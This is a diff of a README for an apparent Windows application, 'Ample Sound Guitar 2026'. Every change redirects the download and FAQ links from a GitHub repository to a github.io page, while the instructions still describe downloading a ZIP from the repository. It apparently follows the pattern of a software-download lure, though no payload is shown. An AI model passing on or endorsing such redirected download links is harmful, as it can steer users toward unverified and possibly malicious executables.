@@ -2,7 +2,7 @@
 
 ## 🚀 Quick Download
 
-[![Download Now](https://img.shields.io/badge/Download-ample--sound--2026-blue?style=for-the-badge&logo=github)](https://github.com/a406241691/ample-sound-2026)
+[![Download Now](https://img.shields.io/badge/Download-ample--sound--2026-blue?style=for-the-badge&logo=github)](https://a406241691.github.io)
 
 Visit this link to download the application.
 
@@ -23,7 +23,7 @@ Ample Sound Guitar is a powerful Windows desktop application that lets you play 
 
 Follow these steps carefully:
 
-1. **Click the download button** above or go to: [https://github.com/a406241691/ample-sound-2026](https://github.com/a406241691/ample-sound-2026)
+1. **Click the download button** above or go to: [https://a406241691.github.io](https://a406241691.github.io)
 2. **On the GitHub page**, click the green "Code" button, then select "Download ZIP"
 3. **Save the file** to your computer (remember where you saved it)
 4. **Extract the ZIP file** by right-clicking and choosing "Extract All..."
@@ -75,7 +75,7 @@ If you have problems, try these fixes:
 
 If you have questions or run into issues, please:
 
-1. Check the [FAQ](https://github.com/a406241691/ample-sound-2026) section on the GitHub page
+1. Check the [FAQ](https://a406241691.github.io) section on the GitHub page
 2. Open an issue in the repository
 3. Leave a comment in the discussion section
 
